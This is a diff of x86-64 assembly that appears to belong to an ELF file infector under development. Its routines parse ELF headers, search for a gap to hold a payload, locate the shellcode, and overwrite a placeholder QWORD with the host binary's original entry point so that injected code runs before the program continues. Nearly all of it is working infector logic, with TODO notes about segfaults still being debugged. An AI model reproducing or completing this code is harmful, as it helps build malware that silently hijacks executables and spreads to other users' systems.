@@ -13,7 +13,7 @@
 
 ; TODO : both filed should be MAP_PRIVATE in mmap:
 ; TODO ommit the null-byte-free coding style on both this version and the 32 bit one
-			; TODO : PROBLEM -> find_shell segfaults
+			; TODO : PROBLEM -> segfault at find_gap
 
 STRUC	stat
 	before_size:	resb	48
@@ -266,10 +266,10 @@ next:
 patching:
 	mov r11, rax			; the shellcode address
 	mov r12, [shellcode_size]
-	mov r11, 0x6969696969696969	; the QWORD to replace in the shellcode
+	mov r13, 0x6969696969696969	; the QWORD to replace in the shellcode
 	; sending the pivot's entry point so we can replace that marker with it
-	mov r13, [pivot_data]
-	add r13, e_entry
+	mov r14, [pivot_data]
+	add r14, e_entry
 
 	call patch_jump_point
 	test rax, rax			; was the marker found and replaced ?
@@ -287,7 +287,7 @@ segments:
 	sub rbx, Elf64_Phdr_size	; pointer to the program headers' base - 1 * Elf64_Phdr_size
 
 	; getting p_phnum
-	mov cx, word[eax + e_phnum]
+	mov cx, word[rax + e_phnum]
 	movzx ecx, cx
 
 next_segment:
@@ -591,14 +591,13 @@ patch_jump_point:	; bool patch_jump_point(char *shellcode, size_t size, QWORD ma
 	;
 	mov rax, r11			; shellcode
 	mov rcx, r12			; size
-	mov rdx, r13			; the marker which is 0x6969696969696969 in this case
 	; the combo rax + rcx points at the last byte in the shellcode ('\0') but we need it to point
 	; at the last QWORD
 	; so -1 byte for '\0' and -7 to point at last QWORD
 	sub rcx, 8			; this might should be 7 (debug!!)
 
 marker_loop:	; will be searching backwards from the end as that's where the marker is likely to be
-	cmp qword[rax + rcx], rdx
+	cmp qword[rax + rcx], r13
 	je found_marker
 
 	dec rcx
@@ -613,14 +612,13 @@ no_mark_found:
 	jmp ret_patch
 
 found_marker:
-	mov rbx, r11			; the original entry point
-	mov [rax + rcx], rbx		; pacthing the shellcode return address
+	mov [rax + rcx], r14		; pacthing the shellcode return address with the original entry point
 	xor eax, eax			; return TRUE
 
 ret_patch:
 	;restoring saved registers
-	pop rdx
 	pop rcx
+	pop rbx
 	pop rbx
 
 	ret	
@@ -649,18 +647,17 @@ find_shell:	; void *find_shell(void *data, size_t shellcode_size); returns a poi
 	mov ax, word[r11 + e_shstrndx]
 	movzx eax, ax
 	mov ecx, Elf64_Shdr_size
-	mul cx				; rax now has the string table section header offset in file, and rdx
+	mul cx				; rax now has the string table section header offset in file, and rdi
 					; has the sections base in memorry
 	add rax, rdi
 	; now we have pointer to the string table section, but we want the actual offset 
 	; of the section in memorry
 	mov rdx, [rax + sh_offset]
-	add rdx, r11			; from now on, rdx will have a pointer to the string index table,
+	add rdx, r11			; from now on, rdx will has a pointer to the string index table,
 					; we're gonna use this later
 
 
 	; parsing the sections and returning the address of .text
-
 	mov cx, [r11 + e_shnum]
 	movzx ecx, cx
 
@@ -673,7 +670,7 @@ find_shell:	; void *find_shell(void *data, size_t shellcode_size); returns a poi
 
 parsing_loop:
 	; get the sh_name and add it to rdx (the string table offset)
-	mov r12, [rdi + sh_name]
+	mov r12d, dword[rdi + sh_name]
 	add r12, rdx
 	call strcmp
 
